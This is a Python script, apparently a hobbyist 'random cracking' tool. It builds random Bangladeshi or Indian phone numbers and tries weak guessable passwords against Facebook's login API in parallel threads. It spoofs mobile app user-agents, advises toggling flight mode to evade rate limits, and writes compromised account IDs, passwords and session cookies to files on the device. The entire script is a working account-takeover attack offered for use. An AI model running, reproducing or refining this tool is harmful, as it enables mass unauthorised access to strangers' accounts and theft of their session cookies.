#-----------------------[ INFO-CODE ]-----------------------#
"""Open By   : Tanim Hossain [BHOOT-CYBER]
Developer : Tanim Hossain
Github    : Bhoot-Cyber-143
Status    : Open Source"""
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------[ COLOR-CODE ]-----------------------#
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------[ SC-CODE ]-----------------------#
main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;92m$$$$$$\  \033[0;92m $$$$$$\  \033[0;92m$$$$$$\ \033[0;92m$$$$$$$$\    \033[0;92m     ║
║\033[0;92m$$  __$$\ \033[0;92m$$  __$$\ \033[0;92m\_$$  _|\033[0;92m$$  _____|   \033[0;92m    ║
║\033[0;92m$$ /  $$ |\033[0;92m$$ /  \__|  \033[0;92m$$ |  \033[0;92m$$ |      \033[0;92m       ║
║\033[0;92m$$$$$$$$ |\033[0;92m$$$$$$\     \033[0;92m$$ |  \033[0;92m$$$$$\        \033[0;92m   ║
║\033[0;92m$$  __$$ | \033[0;92m\____$$\   \033[0;92m$$ |  \033[0;92m$$  __|         \033[0;92m ║
║\033[0;92m$$ |  $$ |\033[0;92m$$\   $$ |  \033[0;92m$$ |  \033[0;92m$$ |            \033[0;92m ║
║\033[0;92m$$ |  $$ |\033[0;92m\$$$$$$  |\033[0;92m$$$$$$\ \033[0;92m$$ |            \033[0;92m ║
║\033[0;92m\__|  \__| \033[0;92m\______/ \033[0;92m\______|\033[0;92m\__|            \033[0;92m ║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;92m    [ 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 𝑶𝑵𝑳𝒀 𝑩𝑨𝑵𝑮𝑳𝑨𝑫𝑬𝑺𝑯 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 ]\033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[0;92m
╠══[𝐶𝑅𝐸𝐴𝑇𝑂𝑅                • \33[1;38m𝑨𝐿𝐴𝑋_𝑨𝑆𝐼𝐹]\33[1;38m     \033[1;31m                 
╠══[𝑀𝑌 𝐺𝐼𝑇𝐻𝑈𝐵              • \33[1;38m𝑅2𝐹10-56-790 ]   \33[1;34m                                 
╠══[𝐶𝑂𝑁𝑇𝐴𝐶𝑇                • 018***^^^07 ] \33[1;35m                                                           
╠══[𝐶𝐴𝑀𝐴𝑁𝐷                 • 𝑂𝑁𝐿𝑌 𝑀𝐸  ]     \33[1;32m                                                          
╠══[𝑉𝐸𝑅𝑇𝐼𝑂𝑁                • 1.3 ]        \033[1;35m                                                                       
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0;92m
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱"""
#-----------------------[ CLEAR-CODE ]-----------------------#
def fresh():os.system('clear');print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def line():print(f'{line_x}')
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f' (1) Random Cracking \n (2) Help Senter \n (3) Exit Manu ');line()
    manu = input(f' (+) {c} : ')
    if manu in ['1','01']:country()
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/cyber.king.tanim');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
    fresh();print(f' {main_x} ');line()
    con_ck = input(f' (+) {c} : ')
    if con_ck in ['1','01']:rndm_bd()
    elif con_ck in ['2','02']:rndm_ind()
    else:Main()
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_bd():
        fresh();print(f' (+) Example : {bd_x} ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f' (+) Example : {ind_x}  ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} (Finding) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        # Define possible values for each part of the User-Agent string
                        fban_fb4a = [
    'FBAN/FB4A',
    'FBAN/FB4A;FBAV/301.0.0.0.65',
    'FBAN/FB4A;FBAV/302.0.0.0.66',
    'FBAN/FB4A;FBAV/303.0.0.0.67',
    'FBAN/FB4A;FBAV/304.0.0.0.68',
    'FBAN/FB4A;FBAV/305.0.0.0.69',
    'FBAN/FB4A;FBAV/306.0.0.0.70',
    'FBAN/FB4A;FBAV/307.0.0.0.71',
    'FBAN/FB4A;FBAV/308.0.0.0.72',
    'FBAN/FB4A;FBAV/309.0.0.0.73',
    'FBAN/FB4A;FBAV/310.0.0.0.74',
    'FBAN/FB4A;FBAV/311.0.0.0.75',
    'FBAN/FB4A;FBAV/312.0.0.0.76',
    'FBAN/FB4A;FBAV/313.0.0.0.77',
    'FBAN/FB4A;FBAV/314.0.0.0.78',
    'FBAN/FB4A;FBAV/315.0.0.0.79',
    'FBAN/FB4A;FBAV/316.0.0.0.80',
    'FBAN/FB4A;FBAV/317.0.0.0.81',
    'FBAN/FB4A;FBAV/318.0.0.0.82',
    'FBAN/FB4A;FBAV/319.0.0.0.83',
    'FBAN/FB4A;FBAV/320.0.0.0.84',
    'FBAN/FB4A;FBAV/321.0.0.0.85',
    'FBAN/FB4A;FBAV/322.0.0.0.86',
    'FBAN/FB4A;FBAV/323.0.0.0.87',
    'FBAN/FB4A;FBAV/324.0.0.0.88',
    'FBAN/FB4A;FBAV/325.0.0.0.89',
    'FBAN/FB4A;FBAV/326.0.0.0.90',
    'FBAN/FB4A;FBAV/327.0.0.0.91',
    'FBAN/FB4A;FBAV/328.0.0.0.92',
    'FBAN/FB4A;FBAV/329.0.0.0.93',
    'FBAN/FB4A;FBAV/330.0.0.0.94',
    'FBAN/FB4A;FBAV/331.0.0.0.95',
    'FBAN/FB4A;FBAV/332.0.0.0.96',
    'FBAN/FB4A;FBAV/333.0.0.0.97',
    'FBAN/FB4A;FBAV/334.0.0.0.98',
    'FBAN/FB4A;FBAV/335.0.0.0.99',
    'FBAN/FB4A;FBAV/336.0.0.0.100',
    'FBAN/FB4A;FBAV/337.0.0.0.101',
    'FBAN/FB4A;FBAV/338.0.0.0.102',
    'FBAN/FB4A;FBAV/339.0.0.0.103',
    'FBAN/FB4A;FBAV/340.0.0.0.104',
    'FBAN/FB4A;FBAV/341.0.0.0.105',
    'FBAN/FB4A;FBAV/342.0.0.0.106',
    'FBAN/FB4A;FBAV/343.0.0.0.107',
    'FBAN/FB4A;FBAV/344.0.0.0.108',
    'FBAN/FB4A;FBAV/345.0.0.0.109',
    'FBAN/FB4A;FBAV/346.0.0.0.110',
    'FBAN/FB4A;FBAV/347.0.0.0.111',
    'FBAN/FB4A;FBAV/348.0.0.0.112',
    'FBAN/FB4A;FBAV/349.0.0.0.113']
                        fbav = ['FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999))]
                        fbbv = ['FBBV/' + str(random.randint(1111111, 9999999))]
                        fbdm = [
    'FBDM/{density=1.75,width=720,height=1515}',  # Example for HMD Global
    'FBDM/{density=1.75,width=720,height=1478}',  # Example for TECNO
    'FBDM/{density=1.75,width=720,height=1421}',  # Example for Nokia
    'FBDM/{density=2.5,width=1080,height=2224}',  # Example for Nokia G400 5G
    'FBDM/{density=2.7875001,width=1080,height=2165}',  # Example for Nokia X100
    'FBDM/{density=1.5,width=480,height=854}',  # Example for TECNO
    'FBDM/{density=1.5,width=480,height=854}',  # Example for TECNO
    'FBDM/{density=1.5,width=480,height=854}',  # Example for TECNO
    'FBDM/{density=1.5,width=480,height=854}',  ]                        
                        fblc = [
    'FBLC/en_US',
    'FBLC/en_GB',
    'FBLC/es_ES',
    'FBLC/es_LA',
    'FBLC/fr_FR',
    'FBLC/de_DE',
    'FBLC/it_IT',
    'FBLC/nl_NL',
    'FBLC/pt_BR',
    'FBLC/pt_PT',
    'FBLC/ar_AR',
    'FBLC/bn_IN',
    'FBLC/zh_CN',
    'FBLC/zh_HK',
    'FBLC/zh_TW',
    'FBLC/hr_HR',
    'FBLC/cs_CZ',
    'FBLC/da_DK',
    'FBLC/nl_NL',
    'FBLC/fi_FI',
    'FBLC/fr_FR',
    'FBLC/de_DE',
    'FBLC/el_GR',
    'FBLC/iw_IL',
    'FBLC/hi_IN',
    'FBLC/hu_HU',
    'FBLC/in_ID',
    'FBLC/ja_JP',
    'FBLC/ko_KR',
    'FBLC/ms_MY',
    'FBLC/nb_NO',
    'FBLC/fa_IR',
    'FBLC/pl_PL',
    'FBLC/ro_RO',
    'FBLC/ru_RU',
    'FBLC/sr_RS',
    'FBLC/sk_SK',
    'FBLC/sl_SI',
    'FBLC/es_CL',
    'FBLC/sv_SE',
    'FBLC/tl_PH',
    'FBLC/th_TH',
    'FBLC/tr_TR',
    'FBLC/uk_UA',
    'FBLC/vi_VN',
    'FBLC/cy_GB',
    'FBLC/ur_PK',
    'FBLC/fy_NL',
    'FBLC/ne_NP',
    'FBLC/sq_AL',
    'FBLC/am_ET',
    'FBLC/hy_AM',
    'FBLC/az_AZ',
    'FBLC/eu_ES',
    'FBLC/be_BY',
    'FBLC/bs_BA',
    'FBLC/ka_GE',
    'FBLC/is_IS',
    'FBLC/jv_ID',
    'FBLC/kn_IN',
    'FBLC/kk_KZ',
    'FBLC/km_KH',
    'FBLC/lo_LA',
    'FBLC/la_VA',
    'FBLC/lv_LV',
    'FBLC/lt_LT',
    'FBLC/mk_MK',
    'FBLC/mg_MG',
    'FBLC/ms_BN',
    'FBLC/mt_MT',
    'FBLC/mr_IN',
    'FBLC/mn_MN',
    'FBLC/my_MM',
    'FBLC/nl_BE',
    'FBLC/no_NO',
    'FBLC/or_IN',
    'FBLC/ps_AF',
    'FBLC/fa_AF',
    'FBLC/pa_IN',
    'FBLC/qu_PE',
    'FBLC/ro_MD',
    'FBLC/rw_RW',
    'FBLC/sm_WS',
    'FBLC/st_ZA',
    'FBLC/sn_ZW',
    'FBLC/so_SO',
    'FBLC/sq_MK',
    'FBLC/sr_ME',
    'FBLC/su_ID',
    'FBLC/sw_KE',
    'FBLC/tg_TJ',
    'FBLC/ta_IN',
    'FBLC/tt_RU',
    'FBLC/te_IN',
    'FBLC/th_KH',
    'FBLC/ti_ET',
    'FBLC/to_TO',
    'FBLC/ts_ZA',
    'FBLC/tn_BW',
    'FBLC/tr_CY',
    'FBLC/tk_TM',
    'FBLC/uz_UZ',
    'FBLC/ve_ZA',
    'FBLC/vo_001',
    'FBLC/wa_BE',
    'FBLC/wo_SN',
    'FBLC/xh_ZA',
    'FBLC/yi_US',
    'FBLC/yo_NG',
    'FBLC/zu_ZA']
                        fbrv =[
    'FBRV/541211947',
    'FBRV/0',
    'FBRV/537275962',
    'FBRV/478477801',
    'FBRV/475722615',
    'FBRV/30034644',
    'FBRV/479317306',
    'FBRV/478970936',
    'FBRV/478880211',
    'FBRV/478478064',
    'FBRV/478249893',
    'FBRV/478037428',
    'FBRV/477481714',
    'FBRV/477125993',
    'FBRV/476729007',
    'FBRV/476465495',
    'FBRV/476253783',
    'FBRV/475744275',
    'FBRV/475337385',
    'FBRV/474931337',
    'FBRV/474441042',
    'FBRV/473917206',
    'FBRV/473216533',
    'FBRV/472359048',
    'FBRV/471660229',
    'FBRV/470651795',
    'FBRV/469522557',
    'FBRV/468531229',
    'FBRV/467507693',
    'FBRV/466724884',
    'FBRV/465653504',
    'FBRV/464476908',
    'FBRV/463448586',
    'FBRV/462393688',
    'FBRV/461247332',
    'FBRV/460085039',
    'FBRV/458998020',
    'FBRV/458028990',
    'FBRV/456759719',
    'FBRV/455597378',
    'FBRV/454650357',
    'FBRV/453687517',
    'FBRV/452531181',
    'FBRV/451275304',
    'FBRV/450172551',
    'FBRV/448983014',
    'FBRV/447787030',
    'FBRV/446453875',
    'FBRV/444891874',
    'FBRV/443722429',
    'FBRV/442395281',
    'FBRV/440700434',
    'FBRV/438152587',
    'FBRV/435465179',
    'FBRV/432878540',
    'FBRV/429953098',
    'FBRV/426467586',
    'FBRV/422958444',
    'FBRV/420325899',
    'FBRV/417597586',
    'FBRV/414273080',
    'FBRV/410852912',
    'FBRV/407639217',
    'FBRV/404425199',
    'FBRV/401334144',
    'FBRV/398187692',
    'FBRV/395097061',
    'FBRV/392031060',
    'FBRV/389015326',
    'FBRV/385772744',
    'FBRV/382508485',
    'FBRV/379209121',
    'FBRV/375911389',
    'FBRV/372587842',
    'FBRV/369277756',
    'FBRV/365938936',
    'FBRV/362630531',
    'FBRV/359289291',
    'FBRV/355969540',
    'FBRV/352579744',
    'FBRV/349298014',
    'FBRV/345964358',
    'FBRV/342553169',
    'FBRV/339190213',
    'FBRV/335852353',
    'FBRV/332440744',
    'FBRV/329140261',
    'FBRV/325843309',
    'FBRV/322505412',
    'FBRV/319171616',
    'FBRV/315872340',
    'FBRV/312514289',
    'FBRV/309220097',
    'FBRV/305913356',
    'FBRV/302625731',
    'FBRV/299290432',
    'FBRV/295952127',
    'FBRV/292620569',
    'FBRV/289287935',
    'FBRV/285950460',
    'FBRV/282602451',
    'FBRV/279317302',
    'FBRV/275970156',
    'FBRV/272630402',
    'FBRV/269296165',
    'FBRV/265978679',
    'FBRV/262625013',
    'FBRV/259281689',
    'FBRV/255942133',
    'FBRV/252602470',
    'FBRV/249300742',
    'FBRV/245966906',
    'FBRV/242651116',
    'FBRV/239291759',
    'FBRV/235963618',
    'FBRV/232609215',
    'FBRV/229298064',
    'FBRV/225977275',
    'FBRV/222610496',
    'FBRV/219292266',
    'FBRV/215979260',
    'FBRV/212653107',
    'FBRV/209291682',
    'FBRV/205988690',
    'FBRV/202672005',
    'FBRV/199343264',
    'FBRV/195989604',
    'FBRV/192675462',
    'FBRV/189343227',
    'FBRV/185989722',
    'FBRV/182674360',
    'FBRV/179329186',
    'FBRV/175993336',
    'FBRV/172634134',
    'FBRV/169307012',
    'FBRV/165982720',
    'FBRV/162644551',
    'FBRV/159324610',
    'FBRV/155985430',
    'FBRV/152643544',
    'FBRV/149308748',
    'FBRV/145985537',
    'FBRV/142640018',
    'FBRV/139328299',
    'FBRV/135988582',
    'FBRV/132637181',
    'FBRV/129325659',
    'FBRV/125992176',
    'FBRV/122638086',
    'FBRV/119325324']
                        fbcr = [
    'FBCR/Verizon Wireless',
    'FBCR/AT&T',
    'FBCR/Sprint',
    'FBCR/T-Mobile',
    'FBCR/Metro by T-Mobile',
    'FBCR/US Cellular',
    'FBCR/Boost Mobile',
    'FBCR/Cricket Wireless',
    'FBCR/TracFone Wireless',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/C Spire Wireless',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Cricket Wireless',
    'FBCR/TracFone Wireless',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/C Spire Wireless',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',]
                        fbmf = [
    'FBMF/HMD Global',
    'FBMF/TECNO',
    'FBMF/Samsung',
    'FBMF/OnePlus',
    'FBMF/Google',
    'FBMF/Xiaomi',
    'FBMF/Apple',
    'FBMF/HTC',
    'FBMF/LG',
    'FBMF/Sony',
    'FBMF/Motorola',
    'FBMF/Huawei',
    'FBMF/OPPO',
    'FBMF/Vivo',
    'FBMF/Realme',
    'FBMF/Nokia',
    'FBMF/Asus',
    'FBMF/Lenovo',
    'FBMF/ZTE',
    'FBMF/Alcatel',
    'FBMF/Amazon',
    'FBMF/Razer',
    'FBMF/Essential',
    'FBMF/BlackBerry',
    'FBMF/Microsoft',
    'FBMF/Meizu',
    'FBMF/Palm',
    'FBMF/Nextbit',
    'FBMF/LeEco',
    'FBMF/Sharp',
    'FBMF/TCL',
    'FBMF/Google Pixel',
    'FBMF/Google Nexus',
    'FBMF/Google Pixelbook',
    'FBMF/Google Pixel Slate',
    'FBMF/Google Home',
    'FBMF/Google Chromecast',
    'FBMF/Google Nest',
    'FBMF/Google Stadia',
    'FBMF/Google Wifi',
    'FBMF/Google Daydream',
    'FBMF/Google Glass',
    'FBMF/Google Cardboard',
    'FBMF/Google Clips',
    'FBMF/Google Jamboard',
    'FBMF/Google OnHub',
    'FBMF/Google Pixel Buds',
    'FBMF/Google Pixel Stand',
    'FBMF/Google Titan Security Key',
    'FBMF/Google Titan Security Key Mini',
    'FBMF/Google USB Type-C Earbuds',
    'FBMF/Google USB-C to 3.5mm Headphone Adapter',
    'FBMF/Google Nest Hub',
    'FBMF/Google Nest Hub Max',
    'FBMF/Google Nest Mini',
    'FBMF/Google Nest Wifi',
    'FBMF/Google Pixel 4',
    'FBMF/Google Pixel 4 XL',
    'FBMF/Google Pixel 3',
    'FBMF/Google Pixel 3 XL',
    'FBMF/Google Pixel 3a',
    'FBMF/Google Pixel 3a XL',
    'FBMF/Google Pixel 2',
    'FBMF/Google Pixel 2 XL',
    'FBMF/Google Pixel',
    'FBMF/Google Pixel XL',
    'FBMF/Google Pixel C',
    'FBMF/Google Home Mini',
    'FBMF/Google Home Max',
    'FBMF/Google Nest Hub Max',
    'FBMF/Google Nest Hub',
    'FBMF/Google Chromecast',
    'FBMF/Google Chromecast Ultra',
    'FBMF/Google Chromecast Audio',
    'FBMF/Google Wifi',
    'FBMF/Google Nest Wifi',
    'FBMF/Google Daydream View',
    'FBMF/Google Daydream View (2017)',
    'FBMF/Google Cardboard',
    'FBMF/Google Cardboard (2015)',
    'FBMF/Google Clips',
    'FBMF/Google Jamboard',
    'FBMF/Google Pixel Buds',
    'FBMF/Google Pixel Buds (2017)',
    'FBMF/Google Pixel Buds (2020)',
    'FBMF/Google Pixel Stand',
    'FBMF/Google Titan Security Key',
    'FBMF/Google Titan Security Key Mini',
    'FBMF/Google USB Type-C Earbuds',
    'FBMF/Google USB-C to 3.5mm Headphone Adapter',
    'FBMF/Google Assistant',
    'FBMF/Google Assistant (2016)',
    'FBMF/Google Assistant (2017)',
    'FBMF/Google Assistant (2018)',
    'FBMF/Google Assistant (2019)',
    'FBMF/Google Assistant (2020)',
    'FBMF/Google Assistant (2021)',
    'FBMF/Google Assistant (2022)',
    'FBMF/Google Assistant (2023)',
    'FBMF/Google Assistant (2024)',
    'FBMF/Google Assistant (2025)',
    'FBMF/Google Assistant (2026)',
    'FBMF/Google Assistant (2027)',
    'FBMF/Google Assistant (2028)',
    'FBMF/Google Assistant (2029)',
    'FBMF/Google Assistant (2030)',
    'FBMF/Google Assistant (2031)',
    'FBMF/Google Assistant (2032)',
    'FBMF/Google Assistant (2033)',
    'FBMF/Google Assistant (2034)',
    'FBMF/Google Assistant (2035)',
    'FBMF/Google Assistant (2036)',
    'FBMF/Google Assistant (2037)',
    'FBMF/Google Assistant (2038)',
    'FBMF/Google Assistant (2039)',
    'FBMF/Google Assistant (2040)',
    'FBMF/Google Assistant (2041)',
    'FBMF/Google Assistant (2042)',
    'FBMF/Google Assistant (2043)',
    'FBMF/Google Assistant (2044)',
    'FBMF/Google Assistant (2045)',
    'FBMF/Google Assistant (2046)',
    'FBMF/Google Assistant (2047)',
    'FBMF/Google Assistant (2048)',
    'FBMF/Google Assistant (2049)',
    'FBMF/Google Assistant (2050)',
    'FBMF/Google Assistant (2051)',
    'FBMF/Google Assistant (2052)',
    'FBMF/Google Assistant (2053)',
    'FBMF/Google Assistant (2054)',
    'FBMF/Google Assistant (2055)',
    'FBMF/Google Assistant (2056)',
    'FBMF/Google Assistant (2057)',
    'FBMF/Google Assistant (2058)',
    'FBMF/Google Assistant (2059)',
    'FBMF/Google Assistant (2060)',
    'FBMF/Google Assistant (2061)',
    'FBMF/Google Assistant (2062)',
    'FBMF/Google Assistant (2063)',
    'FBMF/Google Assistant (2064)',
    'FBMF/Google Assistant (2065)',
    'FBMF/Google Assistant (2066)',
    'FBMF/Google Assistant (2067)',
    'FBMF/Google Assistant (2068)',
    'FBMF/Google Assistant (2069)',
    'FBMF/Google Assistant (2070)',
    'FBMF/Google Assistant (2071)',
    'FBMF/Google Assistant (2072)',
    'FBMF/Google Assistant (2073)',
    'FBMF/Google Assistant (2074)',
    'FBMF/Google Assistant (2075)',
    'FBMF/Google Assistant (2076)',]
                        fbbd = ['FBBD/Nokia', 'FBBD/N151DL', 'FBBD/N156DL', 'FBBD/Nokia G400 5G', 'FBBD/Nokia X100', 'FBBD/TECNO']
                        fbpn = ['FBPN/com.facebook.katana']
                        fbdv = ['FBDV/Nokia G10', 'FBDV/N151DL', 'FBDV/N156DL', 'FBDV/Nokia G400 5G', 'FBDV/Nokia X100', 'FBDV/TECNO-W3']
                        fbsv = ['FBSV/13', 'FBSV/12', 'FBSV/11', 'FBSV/6.0']
                        fbop = ['FBOP/1', 'FBOP/19']
                        fbca = ['FBCA/arm64-v8a:', 'FBCA/armeabi-v7a:armeabi;']
                        # Assemble the User-Agent string
                        user_agent = ';'.join(random.choice(part) for part in [fban_fb4a, fbav, fbbv, fban_fb4a, fbav, fbbv, fbdm, fblc, fbrv, fbcr, fbmf, fbbd, fbpn, fbdv, fbsv, fbop, fbca])
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': user_agent, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} (Running) {str(uid)} | {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                open('/sdcard/BHOOT-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (Fucking) {str(uid)} | {pas} ')
                                open('/sdcard/BHOOT-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------[ END-CODE ]-----------------------#
Main()
